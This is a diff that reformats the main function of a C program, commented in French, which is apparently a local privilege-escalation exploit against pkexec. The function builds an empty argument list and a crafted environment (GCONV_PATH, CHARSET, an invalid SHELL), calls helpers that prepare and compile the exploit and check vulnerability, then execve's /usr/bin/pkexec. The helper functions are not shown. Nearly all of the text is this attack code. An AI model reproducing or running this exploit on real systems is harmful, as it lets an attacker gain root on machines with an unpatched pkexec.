@@ -1,25 +1,27 @@
-int main(int argc, char *argv[]) {
-         // Créer un pointeur de fichier pour écrire dans le fichier exploit.c
-	FILE *fp;
+int main(int argc, char * argv[]) {
+  // Créer un pointeur de fichier pour écrire dans le fichier exploit.c
+  FILE * fp;
 
-	char * a_argv[]={ NULL };
-    	char * a_envp[]={
-            "exploit", 
-	    "PATH=GCONV_PATH=.", 
-	    "CHARSET=NOT_UTF8", 
-	    "SHELL=not/in/etc/shells", 
-	    NULL
-    	};
+  char * a_argv[] = {
+    NULL
+  };
+  char * a_envp[] = {
+    "exploit",
+    "PATH=GCONV_PATH=.",
+    "CHARSET=NOT_UTF8",
+    "SHELL=not/in/etc/shells",
+    NULL
+  };
 
-	gconvpath();
-	
-	iconv_open();
+  gconvpath();
 
-	compileExploit();
+  iconv_open();
 
-	checkVulnerability();
+  compileExploit();
 
-        // Si le système est vulnérable à l'exploit, exécuter pkexec en utilisant les
-        // arguments a_argv et les variables d'environnement a_envp.
-	execve("/usr/bin/pkexec", a_argv, a_envp);
+  checkVulnerability();
+
+  // Si le système est vulnérable à l'exploit, exécuter pkexec en utilisant les
+  // arguments a_argv et les variables d'environnement a_envp.
+  execve("/usr/bin/pkexec", a_argv, a_envp);
 }
